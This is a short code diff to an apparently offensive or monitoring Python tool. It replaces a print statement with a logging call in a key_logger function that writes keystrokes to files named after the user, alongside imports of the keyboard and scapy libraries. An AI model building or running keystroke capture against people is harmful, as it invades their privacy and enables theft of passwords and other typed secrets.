@@ -1,4 +1,4 @@
-from utilities import current_time, user_name, active_interface
+from utilities import current_time, user_name, log_console
 import logging
 import keyboard
 import scapy.all as scapy
@@ -18,7 +18,7 @@ def key_logger():
     """
     Starts the key logger and writes keystrokes to a uniquely named log file.
     """
-    print("Key Logger started and running...\n")
+    log_console("Key Logger started and running...", "INFO")
     log_filename = f"keylog-{user_name()}_{current_time()}.txt"
     logger = setup_logger(log_filename, "KeyLogger")
 
